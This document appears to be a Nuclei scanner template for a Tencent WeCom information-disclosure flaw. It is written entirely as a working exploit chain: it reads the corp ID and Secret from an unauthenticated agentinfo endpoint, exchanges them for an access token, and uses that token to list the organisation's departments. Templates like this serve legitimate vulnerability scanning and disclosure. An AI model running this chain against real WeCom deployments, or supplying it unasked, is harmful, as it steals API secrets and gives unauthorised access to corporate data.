id: tencent-wecom-info-disclosure
info:
  name: Tencent WeCom Information Disclosure
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Tencent WeCom has an information leakage vulnerability, allowing attackers to read sensitive system information by accessing specific API endpoints.
  reference:
    - https://security.tencent.com/qywx
    - https://www.tencent.com/
  tags: information-disclosure, tencent

variables:
  corp_id_regex: '\\"strcorpid\\":\\"(.*?)\\",\\"corpid\\"'
  secret_regex: '\\"Secret\\":\\"(.*?)\\"'
  access_token_regex: '\\"access_token\\":\\"(.*?)\\"'

flow: http(1) && http(2) && http(3)

http:
  - id: agentinfo-check
    method: GET
    path:
      - "/cgi-bin/gateway/agentinfo"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"strcorpid":'
          - '"Secret":'
          - '"corpid":'
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: corp_id
        internal: true
        group: 1
        regex:
          - '{{corp_id_regex}}'
      - type: regex
        name: secret
        internal: true
        group: 1
        regex:
          - '{{secret_regex}}'

  - id: access-token-fetch
    method: POST
    path:
      - "/cgi-bin/gettoken"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "corpid={{corp_id}}&corpsecret={{secret}}"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"access_token":'
          - '"expires_in":'
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: access_token
        internal: true
        group: 1
        regex:
          - '{{access_token_regex}}'

  - id: department-info-fetch
    method: GET
    path:
      - "/cgi-bin/department/list?access_token={{access_token}}"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"department":'
          - '"errmsg":"ok"'
      - type: status
        status:
          - 200
